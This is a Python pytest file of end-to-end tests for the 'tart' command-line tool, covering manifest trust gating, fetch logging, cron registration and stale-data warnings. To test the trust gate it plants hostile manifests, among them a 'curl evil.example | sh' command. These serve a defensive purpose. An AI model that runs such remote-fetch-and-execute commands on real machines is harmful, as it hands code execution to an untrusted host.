"""End-to-end through the real CLI, as a subprocess.

Everything else tests a function; this tests the thing a user and an agent
actually invoke — argument dispatch, cwd handling, TART_MANIFEST plumbing,
the manifest driving both scripts, and the exit codes automation depends
on. Several bugs this session lived exactly here and nowhere else: a fetch
script that couldn't find its manifest, `run` resolving from the wrong
directory, an entry point renamed out from under the package.
"""

import json
import os
import re
import subprocess
import sys
import textwrap

import pytest

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


@pytest.fixture
def workspace(tmp_path):
    """A workspace with one complete artifact: manifest, fetch, render."""
    home = tmp_path / "home"
    (home / ".tart").mkdir(parents=True)
    (home / ".tart" / "config.json").write_text(json.dumps({"roots": [str(tmp_path / "ws")]}))

    repo = tmp_path / "ws" / "demo"
    (repo / ".tart").mkdir(parents=True)

    (repo / "fetch.py").write_text(textwrap.dedent("""
        import json, tartifacts
        with open(tartifacts.data_path(), "w") as f:
            json.dump({"rows": [1, 2, 3]}, f)
        print("fetched")
    """))
    (repo / "show.py").write_text(textwrap.dedent("""
        from rich.text import Text
        from tartifacts import app
        def rows(state): return (state.get("data") or {}).get("rows", [])
        app.run(render=lambda st, c: Text(f"ROWS={len(rows(st))}"),
                summary=lambda st: {"rows": len(rows(st))})
    """))
    (repo / ".tart" / "demo.json").write_text(json.dumps({
        "title": "Demo",
        "run": f"{sys.executable} show.py",
        "data": "data/out.json",
        "fetch": f"{sys.executable} fetch.py",
        "stale_after": "1h",
    }))
    # You author it, then you trust it — the same two steps a real user takes.
    tart("trust", "demo", home=home, cwd=tmp_path)
    return tmp_path, home, repo


def tart(*args, home, cwd):
    """Invoke the CLI the way a shell would, pointed at an isolated state
    directory. TART_HOME rather than HOME: it's the seam tart actually
    reads, and it can't be shadowed by whatever the parent process has.
    TART_CRONTAB is ALWAYS set: `tart cron` performs real registration,
    and no test may ever reach the developer's actual crontab."""
    env = {**os.environ, "TART_HOME": str(home / ".tart"), "PYTHONPATH": REPO,
           "TART_CRONTAB": str(home / "crontab.txt")}
    env.pop("TART_MANIFEST", None)
    return subprocess.run(
        [sys.executable, "-m", "tartifacts.cli", *args],
        capture_output=True, text=True, cwd=str(cwd), env=env, timeout=60,
    )


def test_usage_and_exit_code_with_no_arguments(workspace):
    tmp_path, home, repo = workspace
    result = tart(home=home, cwd=repo)
    assert result.returncode == 1
    assert "usage:" in result.stderr


def test_list_finds_the_artifact_from_an_unrelated_directory(workspace):
    tmp_path, home, repo = workspace
    result = tart("list", home=home, cwd=tmp_path)
    assert result.returncode == 0
    assert "demo" in result.stdout and "Demo" in result.stdout


def test_fetch_writes_where_the_manifest_says(workspace):
    tmp_path, home, repo = workspace
    result = tart("fetch", "demo", home=home, cwd=tmp_path)
    assert result.returncode == 0, result.stderr
    # The fetch script never names this path; it asked tartifacts.data_path().
    assert json.loads((repo / "data" / "out.json").read_text()) == {"rows": [1, 2, 3]}


def test_render_json_after_fetch(workspace):
    tmp_path, home, repo = workspace
    tart("fetch", "demo", home=home, cwd=tmp_path)
    result = tart("render", "demo", "--json", home=home, cwd=tmp_path)
    assert result.returncode == 0, result.stderr
    assert json.loads(result.stdout) == {"rows": 3}


def test_render_once_prints_a_frame(workspace):
    tmp_path, home, repo = workspace
    tart("fetch", "demo", home=home, cwd=tmp_path)
    result = tart("render", "demo", home=home, cwd=tmp_path)
    assert "ROWS=3" in result.stdout


def test_arguments_survive_being_passed_through_the_shell(workspace):
    """`run`/`render` exec through `sh -c`, so extra args get quoted. The
    hand-rolled quoter wrapped in single quotes unconditionally, which
    turned an apostrophe into a shell syntax error."""
    tmp_path, home, repo = workspace
    (repo / "show.py").write_text(textwrap.dedent("""
        import sys
        print("ARGS=" + "|".join(sys.argv[1:]))
    """))
    result = tart("render", "demo", "--title", "it's here", home=home, cwd=tmp_path)
    assert result.returncode == 0, result.stderr
    assert "ARGS=--once|--title|it's here" in result.stdout


def test_a_wedged_fetch_is_bounded_not_hung(workspace):
    """`tart run` fetches before it draws; without a ceiling a hung data
    command hangs the launch with no output and no timeout."""
    tmp_path, home, repo = workspace
    manifest = repo / ".tart" / "demo.json"
    spec = json.loads(manifest.read_text())
    # Sleeps well under the outer timeout on purpose: tart kills the shell
    # on its own timeout, but the grandchild survives holding the captured
    # pipe open, so subprocess.run() below cannot return until it exits.
    # A 30s sleep against a 30s timeout is a race, and CI lost it.
    spec["fetch"] = f"{sys.executable} -c 'import time; time.sleep(4)'"
    manifest.write_text(json.dumps(spec))
    tart("trust", "demo", home=home, cwd=tmp_path)   # editing it revoked trust

    env = {**os.environ, "TART_HOME": str(home / ".tart"), "PYTHONPATH": REPO}
    result = subprocess.run(
        [sys.executable, "-c",
         "import tartifacts.refresh, tartifacts.cli; tartifacts.refresh.FETCH_TIMEOUT = 1.0; tartifacts.cli.main()",
         "fetch", "demo"],
        capture_output=True, text=True, cwd=str(tmp_path), env=env, timeout=30,
    )
    assert result.returncode == 124                 # conventional timeout status
    assert "timed out" in result.stderr


def test_unknown_artifact_fails_with_guidance(workspace):
    tmp_path, home, repo = workspace
    result = tart("render", "nope", home=home, cwd=tmp_path)
    assert result.returncode == 1
    assert "no artifact 'nope'" in result.stderr
    assert "tart list" in result.stderr


def test_duplicate_names_are_reported_not_guessed(workspace):
    tmp_path, home, repo = workspace
    other = tmp_path / "ws" / "other"
    (other / ".tart").mkdir(parents=True)
    (other / ".tart" / "demo.json").write_text(json.dumps({"title": "Other", "run": "true"}))

    result = tart("render", "demo", home=home, cwd=tmp_path)
    assert result.returncode == 1
    assert "demo/demo" in result.stderr and "other/demo" in result.stderr


def test_qualified_name_resolves_a_duplicate(workspace):
    tmp_path, home, repo = workspace
    other = tmp_path / "ws" / "other"
    (other / ".tart").mkdir(parents=True)
    (other / ".tart" / "demo.json").write_text(json.dumps({"title": "Other", "run": "true"}))

    tart("fetch", "demo/demo", home=home, cwd=tmp_path)
    result = tart("render", "demo/demo", "--json", home=home, cwd=tmp_path)
    assert json.loads(result.stdout) == {"rows": 3}


def test_roots_add_and_list(workspace):
    tmp_path, home, repo = workspace
    target = tmp_path / "another"
    target.mkdir()
    result = tart("roots", "add", str(target), home=home, cwd=tmp_path)
    assert result.returncode == 0 and str(target) in result.stdout
    assert str(target) in tart("roots", home=home, cwd=tmp_path).stdout


def test_skill_is_printed(workspace):
    tmp_path, home, repo = workspace
    result = tart("--skill", home=home, cwd=tmp_path)
    assert result.returncode == 0
    assert result.stdout.startswith("# tart")
    for command in ("list", "run", "render", "fetch", "roots"):
        assert command in result.stdout


# --- trust gate ------------------------------------------------------------


def test_an_untrusted_manifest_will_not_run(tmp_path):
    """The threat: a cloned repo puts a .tart/ where tart's scan reaches it,
    and `tart render` — which reads like a read — executes it."""
    home = tmp_path / "home"
    (home / ".tart").mkdir(parents=True)
    (home / ".tart" / "config.json").write_text(json.dumps({"roots": [str(tmp_path / "ws")]}))
    hostile = tmp_path / "ws" / "cloned"
    (hostile / ".tart").mkdir(parents=True)
    (hostile / ".tart" / "evil.json").write_text(json.dumps({
        "title": "Innocent", "run": f"{sys.executable} -c \"open('pwned','w').write('x')\"",
        "fetch": f"{sys.executable} -c \"open('fetched','w').write('x')\"",
    }))

    for command in (["render", "evil"], ["run", "evil"], ["fetch", "evil"]):
        result = tart(*command, home=home, cwd=tmp_path)
        assert result.returncode == 1, command
        assert "not trusted" in result.stderr
        assert "tart trust evil" in result.stderr       # says how to proceed
    assert not (hostile / "pwned").exists()
    assert not (hostile / "fetched").exists()


def test_the_refusal_shows_what_would_have_run(tmp_path):
    home = tmp_path / "home"
    (home / ".tart").mkdir(parents=True)
    (home / ".tart" / "config.json").write_text(json.dumps({"roots": [str(tmp_path / "ws")]}))
    repo = tmp_path / "ws" / "r"
    (repo / ".tart").mkdir(parents=True)
    (repo / ".tart" / "x.json").write_text(json.dumps(
        {"title": "X", "run": "curl evil.example | sh"}))

    result = tart("render", "x", home=home, cwd=tmp_path)
    assert "curl evil.example | sh" in result.stderr    # read it before agreeing


def test_editing_a_trusted_manifest_asks_again(workspace):
    tmp_path, home, repo = workspace
    tart("fetch", "demo", home=home, cwd=tmp_path)  # else render flags no-data
    assert tart("render", "demo", home=home, cwd=tmp_path).returncode == 0

    spec = json.loads((repo / ".tart" / "demo.json").read_text())
    spec["run"] = spec["run"] + " --extra"
    (repo / ".tart" / "demo.json").write_text(json.dumps(spec))

    result = tart("render", "demo", home=home, cwd=tmp_path)
    assert result.returncode == 1
    assert "has changed since you trusted it" in result.stderr


def test_help_lists_reindex_and_does_not_hijack_a_subcommand_flag(workspace):
    tmp_path, home, repo = workspace
    top = tart("--help", home=home, cwd=tmp_path)
    assert top.returncode == 0 and "reindex" in top.stdout
    # `--help` after `run` belongs to the artifact, so tart must not print
    # its own help and swallow it. Here the artifact is untrusted, which is
    # enough to prove tart passed the args through rather than intercepting.
    passed = tart("run", "demo", "--help", home=home, cwd=tmp_path)
    assert "tart list" not in passed.stdout          # not tart's help text


# --- trust and roots dispatch ---------------------------------------------
# The trust/roots MODULES are unit-tested; their CLI dispatch (_trust,
# _roots) was not, so a mutation to the subcommand routing survived.

def test_trust_list_shows_trusted_and_says_when_empty(workspace):
    tmp_path, home, repo = workspace
    listed = tart("trust", "--list", home=home, cwd=tmp_path)
    assert "demo.json" in listed.stdout and "(ok)" in listed.stdout

    tart("trust", "--forget", "demo", home=home, cwd=tmp_path)
    empty = tart("trust", "--list", home=home, cwd=tmp_path)
    assert "no trusted manifests" in empty.stdout


def test_trust_list_re_validates_and_flags_a_changed_manifest(workspace):
    """`--list` prints the trust store; without re-checking the hash it would
    call a since-edited manifest "ok" while `render` refuses it."""
    tmp_path, home, repo = workspace
    manifest = repo / ".tart" / "demo.json"
    manifest.write_text(manifest.read_text().replace('"Demo"', '"Demo edited"'))
    listed = tart("trust", "--list", home=home, cwd=tmp_path)
    assert "changed — will not run" in listed.stdout
    assert "(ok)" not in listed.stdout


def test_trust_forget_is_honest_about_whether_it_knew_the_manifest(workspace):
    tmp_path, home, repo = workspace
    first = tart("trust", "--forget", "demo", home=home, cwd=tmp_path)
    assert "forgot demo" in first.stdout
    again = tart("trust", "--forget", "demo", home=home, cwd=tmp_path)
    assert "was not trusted" in again.stdout


def test_trust_forget_actually_revokes(workspace):
    tmp_path, home, repo = workspace
    tart("trust", "--forget", "demo", home=home, cwd=tmp_path)
    blocked = tart("render", "demo", home=home, cwd=tmp_path)
    assert blocked.returncode == 1 and "not trusted" in blocked.stderr


def test_trust_all_trusts_every_declared_artifact(workspace):
    tmp_path, home, repo = workspace
    other = tmp_path / "ws" / "other"
    (other / ".tart").mkdir(parents=True)
    (other / ".tart" / "other.json").write_text(json.dumps({"title": "O", "run": "true"}))

    result = tart("trust", "--all", home=home, cwd=tmp_path)
    assert "demo.json" in result.stdout and "other.json" in result.stdout
    listed = tart("trust", "--list", home=home, cwd=tmp_path).stdout
    assert "demo.json" in listed and "other.json" in listed


def test_roots_rm_removes_a_configured_root(workspace):
    tmp_path, home, repo = workspace
    added = tmp_path / "ws"
    assert str(added) in tart("roots", home=home, cwd=tmp_path).stdout
    tart("roots", "rm", str(added), home=home, cwd=tmp_path)
    after = tart("roots", home=home, cwd=tmp_path)
    assert str(added) not in after.stdout


# --- run refreshes stale data ---------------------------------------------
# The reason `run` exists rather than just `render`. Both branches were
# entirely untested: the audit's mutants could delete the refresh outright.

def test_run_fetches_when_the_data_is_missing_or_stale(workspace):
    tmp_path, home, repo = workspace
    assert not (repo / "data" / "out.json").exists()

    result = tart("run", "demo", home=home, cwd=tmp_path)
    assert "data stale or missing" in result.stderr
    assert (repo / "data" / "out.json").exists()      # fetch actually ran
    assert "ROWS=3" in result.stdout                  # then the artifact ran


def test_run_does_not_refetch_data_that_is_still_fresh(workspace):
    """`stale_after: 1h` on just-fetched data means launch must NOT pay for
    an expensive fetch. Inverting the staleness check has to fail here."""
    tmp_path, home, repo = workspace
    (repo / "fetch.py").write_text(textwrap.dedent("""
        import json, tartifacts
        with open(tartifacts.data_path(), "w") as f:
            json.dump({"rows": [1, 2, 3]}, f)
        open("fetch-count.txt", "a").write("x")
    """))
    tart("trust", "demo", home=home, cwd=tmp_path)
    tart("fetch", "demo", home=home, cwd=tmp_path)
    assert (repo / "fetch-count.txt").read_text() == "x"

    result = tart("run", "demo", home=home, cwd=tmp_path)
    assert "ROWS=3" in result.stdout
    assert (repo / "fetch-count.txt").read_text() == "x"   # not fetched again
    assert "data stale or missing" not in result.stderr


# --- register --------------------------------------------------------------

def test_register_adopts_a_manifest_from_outside_any_root(workspace):
    """The manifest names paths inside its own repo, so tart records the
    LOCATION rather than copying the file — a copy would rot the moment the
    repo moved."""
    tmp_path, home, repo = workspace
    odd = tmp_path / "nowhere" / "deep"
    odd.mkdir(parents=True)
    (odd / "spend.json").write_text(json.dumps({"title": "Spend", "run": "echo RAN"}))

    assert "spend" not in tart("list", home=home, cwd=tmp_path).stdout
    out = tart("register", str(odd / "spend.json"), home=home, cwd=tmp_path)
    assert out.returncode == 0 and "registered Spend" in out.stdout
    assert "spend" in tart("list", home=home, cwd=tmp_path).stdout


def test_registering_trusts_it_so_trust_is_not_a_second_step(workspace):
    """Naming a file on the command line IS the choice the gate exists to
    capture — unlike a manifest tart merely found by scanning."""
    tmp_path, home, repo = workspace
    odd = tmp_path / "nowhere"
    odd.mkdir()
    (odd / "spend.json").write_text(json.dumps({"title": "Spend", "run": "echo RAN"}))
    tart("register", str(odd / "spend.json"), home=home, cwd=tmp_path)

    ran = tart("run", "spend", home=home, cwd=tmp_path)
    assert "RAN" in ran.stdout
    assert "not trusted" not in ran.stderr


def test_editing_a_registered_manifest_still_asks_again(workspace):
    """Auto-trust must not weaken the hash gate: a repo that pulls a changed
    manifest has to be re-approved."""
    tmp_path, home, repo = workspace
    odd = tmp_path / "nowhere"
    odd.mkdir()
    spec = odd / "spend.json"
    spec.write_text(json.dumps({"title": "Spend", "run": "echo RAN"}))
    tart("register", str(spec), home=home, cwd=tmp_path)

    spec.write_text(json.dumps({"title": "Spend", "run": "echo PWNED"}))
    blocked = tart("run", "spend", home=home, cwd=tmp_path)
    assert blocked.returncode == 1
    assert "changed since you trusted it" in blocked.stderr
    assert "PWNED" not in blocked.stdout


def test_a_manifest_found_by_scanning_is_still_untrusted(workspace):
    """The threat register does NOT cover: a cloned repo dropping a manifest
    where the scan reaches it. That one you never chose."""
    tmp_path, home, repo = workspace
    cloned = tmp_path / "ws" / "cloned" / ".tart"
    cloned.mkdir(parents=True)
    (cloned / "evil.json").write_text(json.dumps({"title": "Evil", "run": "echo BAD"}))
    blocked = tart("run", "evil", home=home, cwd=tmp_path)
    assert blocked.returncode == 1 and "not trusted" in blocked.stderr


def test_register_refuses_a_manifest_it_cannot_use(workspace):
    tmp_path, home, repo = workspace
    bad = tmp_path / "bad.json"
    bad.write_text('{"title": "T", "run": ["not", "a", "string"]}')
    out = tart("register", str(bad), home=home, cwd=tmp_path)
    assert out.returncode == 1 and '"run" must be str' in out.stderr


# --- the flight recorder ----------------------------------------------------
# Every fetch — CLI, `tart run`'s pre-launch refresh, keeper, cron — records
# its outcome. These test the surfaces a user or agent actually reads:
# `tart logs`, `tart list`, and `render --json`'s exit code.


def break_fetch(repo, home, tmp_path, script="import sys; print('cannot reach api', file=sys.stderr); sys.exit(7)"):
    manifest = repo / ".tart" / "demo.json"
    spec = json.loads(manifest.read_text())
    spec["fetch"] = f"{sys.executable} -c \"{script}\""
    manifest.write_text(json.dumps(spec))
    tart("trust", "demo", home=home, cwd=tmp_path)   # editing it revoked trust


def test_failed_fetch_is_recorded_and_logs_shows_its_stderr(workspace):
    """The whole point: the diagnosis survives the terminal it once
    scrolled past. `tart logs` must show WHAT failed, WHY, and the output."""
    tmp_path, home, repo = workspace
    break_fetch(repo, home, tmp_path)
    result = tart("fetch", "demo", home=home, cwd=tmp_path)
    assert result.returncode == 7
    assert "cannot reach api" in result.stderr       # still shown live

    logs = tart("logs", "demo", home=home, cwd=tmp_path)
    assert logs.returncode == 0
    assert "FAILED (exit 7)" in logs.stdout
    assert "cannot reach api" in logs.stdout         # and preserved


def test_list_distinguishes_failed_fetch_from_merely_stale(workspace):
    """"⚠ data stale" says the data is old; "✗ fetch failed" says why it
    will stay old. A cron fetch failing all night used to render
    identically to five-minutes-past-its-limit."""
    tmp_path, home, repo = workspace
    break_fetch(repo, home, tmp_path)
    tart("fetch", "demo", home=home, cwd=tmp_path)
    listing = tart("list", home=home, cwd=tmp_path)
    assert "✗ fetch failed (exit 7," in listing.stdout


def test_success_clears_the_failure_from_list(workspace):
    tmp_path, home, repo = workspace
    break_fetch(repo, home, tmp_path)
    tart("fetch", "demo", home=home, cwd=tmp_path)

    # Repair the fetch; the next success must clear the ✗, not linger.
    spec = json.loads((repo / ".tart" / "demo.json").read_text())
    spec["fetch"] = f"{sys.executable} fetch.py"
    (repo / ".tart" / "demo.json").write_text(json.dumps(spec))
    tart("trust", "demo", home=home, cwd=tmp_path)
    assert tart("fetch", "demo", home=home, cwd=tmp_path).returncode == 0

    assert "✗" not in tart("list", home=home, cwd=tmp_path).stdout
    logs = tart("logs", "demo", home=home, cwd=tmp_path)
    assert "last fetch: ok" in logs.stdout
    assert "FAILED (exit 7)" in logs.stdout          # history stays in the log


def test_logs_without_history_says_so(workspace):
    tmp_path, home, repo = workspace
    logs = tart("logs", "demo", home=home, cwd=tmp_path)
    assert logs.returncode == 0
    assert "no fetch recorded" in logs.stdout


def test_render_json_on_never_fetched_artifact_exits_nonzero_with_why(workspace):
    """`{"data": null}` with exit 0 told an agent nothing. The payload
    still prints (partial numbers flow), stderr names the missing file,
    and the exit code says unhealthy."""
    tmp_path, home, repo = workspace
    result = tart("render", "demo", "--json", home=home, cwd=tmp_path)
    assert result.returncode == 1
    assert "does not exist" in result.stderr
    assert "tart fetch demo" in result.stderr        # the fix, prescribed


def test_render_json_mentions_the_failed_fetch(workspace):
    tmp_path, home, repo = workspace
    break_fetch(repo, home, tmp_path)
    tart("fetch", "demo", home=home, cwd=tmp_path)
    result = tart("render", "demo", "--json", home=home, cwd=tmp_path)
    assert result.returncode == 1
    assert "FAILED (exit 7" in result.stderr
    assert "tart logs demo" in result.stderr         # where the output went


# --- env_file: the same environment however the fetch is triggered ----------


def test_env_file_reaches_the_fetch_script(workspace):
    tmp_path, home, repo = workspace
    (tmp_path / "secrets.env").write_text("DEMO_TOKEN=tok-123\n")
    (repo / "fetch.py").write_text(textwrap.dedent("""
        import json, os, tartifacts
        with open(tartifacts.data_path(), "w") as f:
            json.dump({"token_seen": os.environ.get("DEMO_TOKEN")}, f)
    """))
    spec = json.loads((repo / ".tart" / "demo.json").read_text())
    spec["env_file"] = str(tmp_path / "secrets.env")
    (repo / ".tart" / "demo.json").write_text(json.dumps(spec))
    tart("trust", "demo", home=home, cwd=tmp_path)

    assert tart("fetch", "demo", home=home, cwd=tmp_path).returncode == 0
    assert json.loads((repo / "data" / "out.json").read_text()) == {"token_seen": "tok-123"}


def test_env_file_reaches_the_render_script_and_overrides_inherited(workspace):
    """run/render go through the same overlay, and the file WINS over the
    caller's shell — determinism is the point."""
    tmp_path, home, repo = workspace
    (tmp_path / "secrets.env").write_text("DEMO_TOKEN=from-file\n")
    (repo / "show.py").write_text(textwrap.dedent("""
        import os
        print("TOKEN=" + os.environ.get("DEMO_TOKEN", "unset"))
    """))
    spec = json.loads((repo / ".tart" / "demo.json").read_text())
    spec["env_file"] = str(tmp_path / "secrets.env")
    del spec["fetch"], spec["data"]          # isolate the render path
    (repo / ".tart" / "demo.json").write_text(json.dumps(spec))
    tart("trust", "demo", home=home, cwd=tmp_path)

    env = {**os.environ, "TART_HOME": str(home / ".tart"), "PYTHONPATH": REPO,
           "DEMO_TOKEN": "from-shell"}
    result = subprocess.run(
        [sys.executable, "-m", "tartifacts.cli", "render", "demo"],
        capture_output=True, text=True, cwd=str(tmp_path), env=env, timeout=60,
    )
    assert "TOKEN=from-file" in result.stdout


def test_missing_env_file_fails_loudly_and_is_recorded(workspace):
    tmp_path, home, repo = workspace
    spec = json.loads((repo / ".tart" / "demo.json").read_text())
    spec["env_file"] = str(tmp_path / "absent.env")
    (repo / ".tart" / "demo.json").write_text(json.dumps(spec))
    tart("trust", "demo", home=home, cwd=tmp_path)

    result = tart("fetch", "demo", home=home, cwd=tmp_path)
    assert result.returncode == 1
    assert "env_file" in result.stderr and "absent.env" in result.stderr
    # No data was produced by a half-configured run.
    assert not (repo / "data" / "out.json").exists()
    # And the refusal is in the record, where cron's would be found.
    logs = tart("logs", "demo", home=home, cwd=tmp_path)
    assert "env_file" in logs.stdout


def test_logs_shows_the_path_a_failed_fetch_ran_under(workspace):
    tmp_path, home, repo = workspace
    break_fetch(repo, home, tmp_path)
    tart("fetch", "demo", home=home, cwd=tmp_path)
    logs = tart("logs", "demo", home=home, cwd=tmp_path)
    assert "ran with PATH=" in logs.stdout


# --- tart cron --------------------------------------------------------------


def test_cron_show_bakes_in_path_and_a_stale_after_matched_cadence(workspace):
    tmp_path, home, repo = workspace       # stale_after: 1h
    result = tart("cron", "demo", "--show", home=home, cwd=tmp_path)
    assert result.returncode == 0
    line = result.stdout.strip()
    # minute is staggered by name hash so hourly artifacts don't pile on :00
    assert re.match(r"^\d{1,2} \*/1 \* \* \* PATH=", line)
    assert line.endswith("fetch demo")
    assert not (home / "crontab.txt").exists()     # --show installs nothing


def test_cron_without_a_fetch_refuses(workspace):
    tmp_path, home, repo = workspace
    spec = json.loads((repo / ".tart" / "demo.json").read_text())
    del spec["fetch"]
    (repo / ".tart" / "demo.json").write_text(json.dumps(spec))
    result = tart("cron", "demo", home=home, cwd=tmp_path)
    assert result.returncode == 1
    assert 'no "fetch"' in result.stderr


# --- render --states: the smoke matrix --------------------------------------


def declare_states(repo, home, tmp_path, states):
    spec = json.loads((repo / ".tart" / "demo.json").read_text())
    spec["states"] = states
    (repo / ".tart" / "demo.json").write_text(json.dumps(spec))
    tart("trust", "demo", home=home, cwd=tmp_path)


def test_states_renders_every_declared_view(workspace):
    tmp_path, home, repo = workspace
    tart("fetch", "demo", home=home, cwd=tmp_path)
    (repo / "show.py").write_text(textwrap.dedent("""
        from rich.text import Text
        from tartifacts import app
        def render(st, c):
            if st.get("view") == "broken":
                raise KeyError("clickers")     # the keypress-only crash
            return Text("VIEW=" + str(st.get("view")))
        app.run(render=render)
    """))
    declare_states(repo, home, tmp_path, [{"view": "summary"}, {"view": "broken"}])

    result = tart("render", "demo", "--states", home=home, cwd=tmp_path)
    assert result.returncode == 1
    assert "ok    (base)" in result.stdout
    assert 'ok    {"view": "summary"}' in result.stdout
    assert 'FAIL  {"view": "broken"}' in result.stdout
    assert "KeyError" in result.stdout             # the traceback tail, surfaced
    assert "1 of 3 states failed" in result.stderr


def test_states_all_green_exits_zero(workspace):
    tmp_path, home, repo = workspace
    tart("fetch", "demo", home=home, cwd=tmp_path)
    declare_states(repo, home, tmp_path, [{"extra": True}])
    result = tart("render", "demo", "--states", home=home, cwd=tmp_path)
    assert result.returncode == 0, result.stdout + result.stderr
    assert "FAIL" not in result.stdout


def test_states_with_none_declared_still_checks_the_base_frame(workspace):
    tmp_path, home, repo = workspace
    tart("fetch", "demo", home=home, cwd=tmp_path)
    result = tart("render", "demo", "--states", home=home, cwd=tmp_path)
    assert result.returncode == 0
    assert "ok    (base)" in result.stdout
    assert 'declare "states"' in result.stdout     # the nudge


def test_states_rejects_a_non_object_entry(workspace):
    tmp_path, home, repo = workspace
    declare_states(repo, home, tmp_path, ["not-an-object"])
    result = tart("render", "demo", "--states", home=home, cwd=tmp_path)
    assert result.returncode == 1
    assert "must be JSON objects" in result.stderr


# --- TART_PYTHON ------------------------------------------------------------


def test_tart_python_manifest_runs_without_uv(workspace):
    """The memory fix: `$TART_PYTHON show.py` uses tart's own interpreter
    (which has rich+tartifacts by construction) — one process instead of a
    resident uv supervisor plus a second Python. The shell expands the var
    because tart exports it before exec."""
    tmp_path, home, repo = workspace
    spec = json.loads((repo / ".tart" / "demo.json").read_text())
    spec["run"] = "$TART_PYTHON show.py"
    spec["fetch"] = "$TART_PYTHON fetch.py"
    (repo / ".tart" / "demo.json").write_text(json.dumps(spec))
    tart("trust", "demo", home=home, cwd=tmp_path)

    assert tart("fetch", "demo", home=home, cwd=tmp_path).returncode == 0
    result = tart("render", "demo", "--json", home=home, cwd=tmp_path)
    assert result.returncode == 0, result.stderr
    assert json.loads(result.stdout) == {"rows": 3}


def test_tart_python_is_the_interpreter_running_tart(workspace):
    tmp_path, home, repo = workspace
    (repo / "fetch.py").write_text(textwrap.dedent("""
        import json, os, sys, tartifacts
        with open(tartifacts.data_path(), "w") as f:
            json.dump({"tart_python": os.environ.get("TART_PYTHON"),
                       "actual": sys.executable}, f)
    """))
    tart("fetch", "demo", home=home, cwd=tmp_path)
    seen = json.loads((repo / "data" / "out.json").read_text())
    assert seen["tart_python"] == sys.executable   # the CLI's own interpreter


# --- the freshness contract -------------------------------------------------
# These pin the system-level promise, not a mechanism: for an artifact
# declaring stale_after, staleness must never be silent, and a standing
# refresh order must be real (installed), not advisory (printed). They
# exist because 740 mechanism tests passed while a live artifact served
# six-hour-old data for days.


def test_contract_cron_name_actually_registers(workspace):
    """`tart cron <name>` must leave the machine refreshing the artifact —
    the print-only version's line predictably never reached a crontab."""
    tmp_path, home, repo = workspace
    result = tart("cron", "demo", home=home, cwd=tmp_path)
    assert result.returncode == 0
    installed = (home / "crontab.txt").read_text()
    assert re.search(r"\d{1,2} \*/1 \* \* \* PATH=.* fetch demo$", installed, re.M)
    assert installed.count("fetch demo") == 1


def test_contract_registration_survives_sync_and_never_duplicates(workspace):
    """A hand-registered artifact stays registered through every later
    --sync (even without auto_refresh), and re-registering is idempotent."""
    tmp_path, home, repo = workspace
    tart("cron", "demo", home=home, cwd=tmp_path)
    tart("cron", "demo", home=home, cwd=tmp_path)      # idempotent
    tart("cron", "--sync", home=home, cwd=tmp_path)    # demo has no auto_refresh
    installed = (home / "crontab.txt").read_text()
    assert installed.count("fetch demo") == 1


def test_contract_sync_registers_auto_refresh_artifacts(workspace):
    """auto_refresh means "keep this fresh" — with no pane open, that
    promise is only real if --sync turns it into a standing order."""
    tmp_path, home, repo = workspace
    spec = json.loads((repo / ".tart" / "demo.json").read_text())
    spec["auto_refresh"] = True                        # stale_after: 1h
    (repo / ".tart" / "demo.json").write_text(json.dumps(spec))
    tart("trust", "demo", home=home, cwd=tmp_path)

    tart("cron", "--sync", home=home, cwd=tmp_path)
    assert "fetch demo" in (home / "crontab.txt").read_text()


def test_contract_sync_preserves_the_users_own_crontab_lines(workspace):
    tmp_path, home, repo = workspace
    (home / "crontab.txt").write_text("0 3 * * * backup.sh\n")
    tart("cron", "demo", home=home, cwd=tmp_path)
    installed = (home / "crontab.txt").read_text()
    assert "0 3 * * * backup.sh" in installed
    assert "fetch demo" in installed


def test_contract_stale_data_is_never_silent_on_any_read_surface(workspace):
    """The incident: an agent read `render --json` all session while the
    data aged to 6x its declared limit, and nothing said so. Both read
    surfaces must speak."""
    tmp_path, home, repo = workspace
    tart("fetch", "demo", home=home, cwd=tmp_path)
    data = repo / "data" / "out.json"
    old = 7200
    import time as _t
    os.utime(data, (_t.time() - old, _t.time() - old))  # 2h old vs 1h declared

    rendered = tart("render", "demo", "--json", home=home, cwd=tmp_path)
    assert "warning: data is 2h old" in rendered.stderr

    listing = tart("list", home=home, cwd=tmp_path)
    assert "⚠ data stale" in listing.stdout


def test_contract_persistent_failure_reads_as_a_duration(workspace):
    """"exit 7, 2m ago" hides a four-day outage; once a success exists,
    failure must be dated from it."""
    tmp_path, home, repo = workspace
    tart("fetch", "demo", home=home, cwd=tmp_path)     # a success to date from
    break_fetch(repo, home, tmp_path)
    tart("fetch", "demo", home=home, cwd=tmp_path)
    tart("fetch", "demo", home=home, cwd=tmp_path)

    assert "✗ fetch failing for" in tart("list", home=home, cwd=tmp_path).stdout
    assert "failing for" in tart("logs", "demo", home=home, cwd=tmp_path).stdout
